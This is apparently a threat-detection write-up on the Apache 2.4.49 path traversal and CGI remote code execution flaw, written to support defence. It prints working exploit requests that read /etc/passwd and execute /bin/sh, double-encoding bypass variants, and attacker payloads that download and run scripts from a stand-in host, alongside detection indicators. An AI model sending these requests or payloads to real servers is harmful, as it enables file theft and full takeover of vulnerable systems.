Apache HTTP Server 2.4.49 contains a path traversal flaw introduced by a regression in URL path normalization. An attacker can escape the document root using encoded dot-segment sequences, reaching arbitrary files on the filesystem. If `mod_cgi` or `mod_cgid` is enabled, this escalates to unauthenticated Remote Code Execution. The vulnerability is trivially exploitable with a single HTTP request and has been weaponized in mass-exploitation campaigns.

---

## Attack Vector

### Mechanism

The URL normalization routine in Apache 2.4.49 fails to correctly resolve percent-encoded path traversal sequences (e.g., `%2e%2e/`, `.%2e/`, `%2e./`) before applying `Alias` and directory access controls. This allows an attacker to traverse outside the configured document root or alias-mapped directories.

**Two distinct exploitation paths exist:**

#### Path 1 — Arbitrary File Read (Directory Traversal)

**Pre-condition:** A URL-mapped path (via `Alias`, `ScriptAlias`, or similar directive) exists, AND the target directory does not have an explicit `Require all denied` directive.

GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
Host: target.example.com

The server resolves `.%2e/` as `../` after access control checks, serving `/etc/passwd`.

#### Path 2 — Remote Code Execution via CGI

**Pre-condition:** `mod_cgi` or `mod_cgid` is loaded AND enabled for a mapped path (commonly `/cgi-bin/`), AND the traversal pre-condition above is met.

POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

echo;id;whoami

The server executes `/bin/sh` as a CGI script with attacker-controlled stdin as shell input.

## Observable Behaviour

### Network / HTTP Layer Indicators

#### Traversal Encoding Patterns in URI

The following encoded sequences are characteristic of exploitation attempts. Variants exist due to double-encoding (relevant for CVE-2021-42013 bypass):

| Encoding | Decoded Equivalent | Context |
|---|---|---|
| `%2e%2e/` | `../` | Single-encoded traversal |
| `.%2e/` | `../` | Mixed-encoding traversal |
| `%2e./` | `../` | Mixed-encoding traversal |
| `%%32%65` | `%2e` → `.` | Double-encoded (42013 bypass) |
| `%252e` | `%2e` → `.` | Double-encoded variant |

#### Characteristic URI Structures

/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
/cgi-bin/.%2e/.%2e/.%2e/bin/sh
/icons/.%2e/.%2e/.%2e/etc/shadow
/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh

#### HTTP Method

- **GET** — File read exploitation
- **POST** — RCE exploitation (shell command in POST body; body is passed to CGI stdin)

#### POST Body Patterns (RCE)

When `/bin/sh` is invoked as a CGI script, the POST body contains shell commands. Common attacker payloads observed in exploitation campaigns:

echo;id
echo;whoami
echo;uname -a
echo;cat /etc/passwd
echo;curl http://attacker.tld/payload.sh|bash
echo;wget -O /tmp/.x http://attacker.tld/payload && chmod +x /tmp/.x && /tmp/.x

The `echo;` prefix is required to satisfy CGI's expected HTTP header output before command execution.

#### HTTP Response Indicators

| Response Code | Implication |
|---|---|
| `200 OK` | Traversal succeeded; body contains file content or command output |
| `403 Forbidden` | Server is patched or correctly configured; traversal blocked |
| `400 Bad Request` | Encoding rejected — may indicate WAF or patched server |
| `500 Internal Server Error` | CGI invoked but command failed; still indicates a vulnerable server |

### Endpoint / Process Telemetry

If RCE is achieved, the process chain on a Linux host will appear as:

httpd (Apache worker)
  └── sh -c <attacker command>
        └── curl / wget / python / perl / nc (depending on payload)

**Suspicious process ancestry indicators:**

- `httpd` spawning `sh`, `bash`, `dash`, or `ksh`
- `httpd` spawning `curl`, `wget`, `python`, `perl`, `nc`, `ncat`, `socat`
- Shell processes with no TTY (tty=`?`) parented to `httpd`
- Outbound network connections from the `httpd` process or its children to non-standard ports or external IPs

**File system indicators (post-exploitation):**

- Writes to `/tmp/`, `/var/tmp/`, `/dev/shm/` from `httpd` process
- New cron entries or modifications to `/etc/crontab`, `/var/spool/cron/`
- SSH authorized_keys modifications
- SUID/SGID binary drops
